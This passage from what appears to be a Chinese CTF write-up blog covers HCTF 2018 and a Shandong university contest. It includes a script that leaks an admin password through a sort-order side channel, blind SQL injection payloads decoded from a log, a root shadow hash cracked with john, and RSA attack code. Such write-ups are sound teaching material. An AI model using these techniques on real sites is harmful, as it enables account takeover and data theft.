<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">def reg(username,password):</span><br><span class="line">    url = &quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;username&quot;:username,</span><br><span class="line">        &quot;password&quot;:password,</span><br><span class="line">        &quot;sex&quot;:1,</span><br><span class="line">        &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    content = requests.post(url=url,data=data).content</span><br><span class="line">    print content</span><br><span class="line">login_url = &quot;http://game.2018.hctf.io/web2/action.php?action=login&quot;</span><br><span class="line">ss =  &quot;-/123456789&quot;+string.lowercase</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,126):</span><br><span class="line">        username = &quot;aaaafaffmpxxm&quot;+str(i) +&quot;fdfdlxx8alsdff&quot;+str(j)</span><br><span class="line">        password = flag + chr(j)</span><br><span class="line">        print username,password</span><br><span class="line">        reg(username,password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:username,</span><br><span class="line">            &quot;password&quot;:str(password),</span><br><span class="line">            &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        print data</span><br><span class="line">        req = requests.session()</span><br><span class="line">        content = req.post(url=login_url,data=data).content</span><br><span class="line">        #print content</span><br><span class="line">        order_url = &quot;http://game.2018.hctf.io/web2/user.php?order=password&quot;</span><br><span class="line">        content = req.get(url=order_url).content</span><br><span class="line">        #print content</span><br><span class="line">        tmp = re.findall(r&apos;%s[.\s\S]+?&lt;td&gt;\s*1\s*&lt;/td&gt;\s*&lt;td&gt;\s*admin\s*&lt;/td&gt;&apos;%username,content,re.S)</span><br><span class="line">        if tmp:</span><br><span class="line">            flag = flag + chr(j-1)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>密码为dsa8&amp;&amp;!@#$%^&amp;d1ngy1as3dja</p>
<h3 id="freq-game"><a href="#freq-game" class="headerlink" title="freq game"></a>freq game</h3><p>果然爆破是不行的，利用FFT求频域分量，这就触及到我知识的盲区了</p>
<p>Eur3kAd队伍的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import json</span><br><span class="line">import numpy as np</span><br><span class="line">io=remote(&quot;150.109.119.46&quot;,6775)</span><br><span class="line">token=&quot;DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j&quot;</span><br><span class="line">io.recvuntil(&quot;hint:&quot;)</span><br><span class="line">io.sendline(&quot;y&quot;)</span><br><span class="line">io.recvuntil(&quot;token:&quot;)</span><br><span class="line">io.sendline(token)</span><br><span class="line">for i in range(8):</span><br><span class="line">    io.recvuntil(&quot;[&quot;)</span><br><span class="line">    arr=io.recvuntil(&quot;]&quot;)[:-1]</span><br><span class="line">    arr=arr.split(&quot;,&quot;)</span><br><span class="line">    arr=map(float,arr)</span><br><span class="line">    time_val=np.array(arr)</span><br><span class="line"></span><br><span class="line">    freq_val=np.fft.fft(time_val)</span><br><span class="line">    freq_val=map(abs,freq_val)</span><br><span class="line">    freq_val_sorted=[i for i in freq_val]</span><br><span class="line">    freq_val_sorted.sort(reverse=1)</span><br><span class="line">    response=[]</span><br><span class="line">    for j in range(4):</span><br><span class="line">        response.append(min(freq_val.index(freq_val_sorted[j*2]),freq_val.index(freq_val_sorted[j*2+1])))</span><br><span class="line">    response_data=&quot;&quot;</span><br><span class="line">    for ele in response:</span><br><span class="line">        response_data+=str(ele)</span><br><span class="line">        response_data+=&quot; &quot;</span><br><span class="line">    print response_data</span><br><span class="line">    io.sendline(response_data[:-1])</span><br><span class="line">   # io.interactive()</span><br><span class="line">    raw_input()   </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>相关知识：<a href="https://findneo.github.io/171005NuptVigenereWP/" target="_blank" rel="noopener">https://findneo.github.io/171005NuptVigenereWP/</a></p>
<h3 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor?rsa"></a>xor?rsa</h3><p>搬运表哥的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#short_pad_attack</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = <span class="number">27325117725066040425607261774702361305480031598260844657255259687949217947185875178414548742392020321812299436880101297227536559351730987915023996386949560743215563482065620796558339146309680837896911726355137737632498099719814507374535188668253558193836192571274971401444835848784952120830068942707870865057672494962150591569745891058420271040371596557379014064434807827018829839225991842910855143477861477983283840739861588719497836896794690605981838804564450022566211353870681343247472863651535379377939787977703685860325769265931265226619644497391491291527800611615877993682121665020799611215291015673668800698047</span></span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = nbits//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is same"</span> % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ^^ = bit-wise XOR</span></span><br><span class="line">    <span class="comment">#m1 = randrange(2^nbits)</span></span><br><span class="line">    <span class="comment">#m2 = m1 ^^ randrange(2^kbits)</span></span><br><span class="line">    <span class="comment">#c1 = pow(m1, e, n)</span></span><br><span class="line">    <span class="comment">#c2 = pow(m2, e, n)</span></span><br><span class="line">    c1 = <span class="number">11146034647280413317443457623961239386839900851075033268495975097708099527017335893963808711594413240859252161601911195036434302423516981466705590143210837021632070692393449550584035345686324553211866055113228844210586772947411150216954229676034855823178188075496107807422868588742623940922760678808366543964733293726627911767243105246511250395661759753616263358374760407323735205233663336331991977749138009890575029063032763890464116037245275157079519540406571208629258706809359182978155122176341736830080587038326813241565093027445769495005048088248614564197179762009363506397136188047072831062771044194671584000093</span></span><br><span class="line">    c2 = <span class="number">1206394889096499960081166011318481718487253865371591152275319942955987797889761136562701508553079502547193102588852377842551044867961440512715093383379196683866396069689611910096194350083404638346362642034206212849366833513854922022537854397304980423004330041027521742652293082886524946291846011200632987593435588619763971528985802898982891100146430607274314417600181969864547689720620303929732924061673055082880492983474112109999173957339098639555381626435870355703616291445746057601759611370928227297606247782969343337389538257681315001213167257800476196167120597495582636973391942846610897276862327699998885589310</span></span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"difference of two messages is %d"</span> % diff</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print m1</span></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"m1 = "</span>: m1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"m2 = "</span>: m1 + diff</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="http://p0desta.com" target="_blank" rel="noopener">http://p0desta.com</a></p>
<p><a href="https://xz.aliyun.com/t/3253#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-7</a></p>
<p><a href="https://xz.aliyun.com/t/3255#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3255#toc-4</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/11/06/kelai_wp/">第七届山东省大学生网络安全技能大赛决赛Writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-11-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<p>感觉难度不是特别大，不过自己太菜了，很多分不该失</p>
<h3 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h3><blockquote>
<p>从通信方式的角度看，后门可分为http/https型、irc型、dns型、icmp型等等。安全人员抓到一份可疑的流量包，请从中分析出利用某种特殊协议传输的数据。</p>
</blockquote>
<p>这里是通过icmp,直接过滤出来</p>
<p>第一个icmp就给了提示</p>
<p><img src="https://i.loli.net/2018/11/05/5be04ba7a37e4.png" alt="https://i.loli.net/2018/11/05/5be04ba7a37e4.png"></p>
<p>接着每个icmp包里都有一个flag字符，拼起来即可</p>
<p><code>flag{Icmp_backdoor_can_transfer_some_information}</code></p>
<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>首先在分组详情中搜索hostname字符串，接着追踪tcp流，在tcp流中再次查找hostname字符串</p>
<p><img src="https://i.loli.net/2018/11/05/5be051b6c7997.png" alt="https://i.loli.net/2018/11/05/5be051b6c7997.png"></p>
<p>16进制很明显了</p>
<p><code>flag{6ad4c5a09043}</code></p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>有点长，比赛时手撕的。。</p>
<p>赛后了，就写个脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'log.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_and_write</span><span class="params">(a)</span>:</span></span><br><span class="line">    tmp = urllib.unquote(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'200'</span> <span class="keyword">and</span> <span class="string">'flag_is_here'</span> <span class="keyword">and</span> <span class="string">'RCKM'</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">        file.write(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'access.log'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> el <span class="keyword">in</span> f.readlines():</span><br><span class="line">        decode_and_write(el)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'log.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> ff:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    char = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> el <span class="keyword">in</span> ff.readlines():</span><br><span class="line">        num1 = re.findall(<span class="string">r'AND ORD\(MID\(\(SELECT IFNULL\(CAST\(flag AS CHAR\),0x20\) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1\),(.*?),1\)\)&gt;.*?'</span>,el)</span><br><span class="line">        num2 = re.findall(<span class="string">r'AND ORD\(MID\(\(SELECT IFNULL\(CAST\(flag AS CHAR\),0x20\) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1\),.*?,1\)\)&gt;(.*?) AND'</span>,el)</span><br><span class="line">        <span class="keyword">if</span> num1[<span class="number">0</span>] == str(i):</span><br><span class="line">            char = chr(int(str(num2[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += chr(ord(char)+<span class="number">1</span>)</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num1[<span class="number">0</span>] == str(i):</span><br><span class="line">                char = chr(int(str(num2[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5be062d00b570.png" alt="https://i.loli.net/2018/11/05/5be062d00b570.png"></p>
<p>少个}</p>
<h3 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h3><p>foremost分离出图片内的压缩包</p>
<p>压缩包密码在图片详细信息中</p>
<p><code>flag{3XiF_iNf0rM@ti0n}</code></p>
<h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>zip明文攻击</p>
<p><img src="https://i.loli.net/2018/11/06/5be15cc551ed6.png" alt="https://i.loli.net/2018/11/06/5be15cc551ed6.png"></p>
<p>将得到的docx改为.zip,解压，docProps文件夹内有flag.txt</p>
<p>base64解码就好</p>
<p><code>flag{d0cX_1s_ziP_file}</code></p>
<h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p><img src="https://i.loli.net/2018/11/05/5bdffe4075b7c.png" alt="https://i.loli.net/2018/11/05/5bdffe4075b7c.png"></p>
<p>明显RGB画图了，就是135000开不了平方，测试150x900是最好的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(<span class="number">150</span>, <span class="number">900</span>))</span><br><span class="line">fo = open(<span class="string">"basic.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">pics = []</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">135000</span>: </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a = fo.readline()</span><br><span class="line">    pics.append(a)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">str = <span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">900</span>):</span><br><span class="line">        s = pics[i].split(<span class="string">','</span>)</span><br><span class="line">        pic.putpixel([y,x],(int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flagg.png"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5bdffdbd428f7.png" alt="https://i.loli.net/2018/11/05/5bdffdbd428f7.png"></p>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>得到如下文本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</span><br></pre></td></tr></table></figure>
<p>python转换进制即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"text.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">jin = file.read().split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> jin:</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'d'</span>:</span><br><span class="line">        tmp = chr(int(str(i)[<span class="number">1</span>:]))</span><br><span class="line">        data += tmp</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'x'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'b'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'o'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5bdfffaa02e7a.png" alt="https://i.loli.net/2018/11/05/5bdfffaa02e7a.png"></p>
<h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><p>即仿射加密</p>
<p>拿出珍藏的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affine</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    pwd_dic = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        pwd_dic[chr(((a * i + b) % <span class="number">26</span> + <span class="number">97</span>))] = chr(i + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">return</span> pwd_dic</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwd_dic = &#123;&#125;</span><br><span class="line">    pwd = raw_input(<span class="string">'str: '</span>)</span><br><span class="line">    a = input(<span class="string">'input a (c = (am + b) mod 26) : '</span>)</span><br><span class="line">    b = input(<span class="string">'input b (c = (am + b) mod 26) : '</span>)</span><br><span class="line">    plain = []</span><br><span class="line">    pwd_dic = affine(a, b)</span><br><span class="line">    print(pwd_dic)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">        plain.append(pwd_dic[i])</span><br><span class="line">    print(<span class="string">"flag is :"</span> + <span class="string">""</span>.join(plain))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5be048c2c2480.png" alt="https://i.loli.net/2018/11/05/5be048c2c2480.png"></p>
<h3 id="colors"><a href="#colors" class="headerlink" title="colors"></a>colors</h3><p>得到七张图片，stegsolve得到</p>
<p><img src="https://i.loli.net/2018/11/06/5be1011b9148e.png" alt="https://i.loli.net/2018/11/06/5be1011b9148e.png"></p>
<p>更改每张图片高度，都能得到一串小格，应该是二进制了</p>
<p><img src="https://i.loli.net/2018/11/06/5be1015d2437b.png" alt="https://i.loli.net/2018/11/06/5be1015d2437b.png"></p>
<p>比赛时一直横着读的，没想到是竖着读，一个ASCII虽然8位，但最高位是0，这又有七张图片，所以还是太菜了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">'11111111010111101111'</span></span><br><span class="line">c2 = <span class="string">'11111011111110111111'</span></span><br><span class="line">c3 = <span class="string">'00001100101010110001'</span></span><br><span class="line">c4 = <span class="string">'01001010010000001101'</span></span><br><span class="line">c5 = <span class="string">'11010011011101010111'</span></span><br><span class="line">c6 = <span class="string">'10011011011010110110'</span></span><br><span class="line">c7 = <span class="string">'00111001101101111101'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]</span><br><span class="line">    flag += chr(int(c,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p><code>flag{Png1n7erEs7iof}</code></p>
<h3 id="CrackIt"><a href="#CrackIt" class="headerlink" title="CrackIt"></a>CrackIt</h3><p>一个shadow文件，含加密的root密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>幸亏有工具john</p>
<p><img src="https://i.loli.net/2018/11/06/5be0fce37903c.png" alt="https://i.loli.net/2018/11/06/5be0fce37903c.png"></p>
<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line"></span><br><span class="line">enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span><br></pre></td></tr></table></figure>
<p>工具一把梭</p>
